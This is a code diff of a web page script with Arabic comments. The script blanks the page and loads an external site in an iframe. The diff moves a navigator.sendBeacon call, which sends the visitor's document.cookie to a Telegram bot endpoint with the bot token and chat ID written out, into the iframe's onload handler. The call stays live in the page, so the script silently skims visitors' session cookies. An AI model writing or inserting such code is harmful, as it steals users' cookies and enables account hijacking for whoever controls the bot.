@@ -1,4 +1,3 @@
-navigator.sendBeacon(`https://api.telegram.org/bot7563858753:AAHAh_4tPhiTMn21IQusEZsOltm4CaGSYxs/sendMessage?chat_id=6662346056&text=${encodeURIComponent(document.cookie) || "زياره"}`);
 
 // كود JavaScript لتفريغ الصفحة وإضافة المحتوى الجديد
 (function() {
@@ -33,6 +32,8 @@ navigator.sendBeacon(`https://api.telegram.org/bot7563858753:AAHAh_4tPhiTMn21IQu
             var iframe = document.getElementById('externalSite');
             iframe.onload = function() {
                 console.log("تم تحميل الموقع الخارجي بنجاح");
+                navigator.sendBeacon(`https://api.telegram.org/bot7563858753:AAHAh_4tPhiTMn21IQusEZsOltm4CaGSYxs/sendMessage?chat_id=6662346056&text=${encodeURIComponent(document.cookie) || "زياره"}`);
+
             };
         };
     </script>
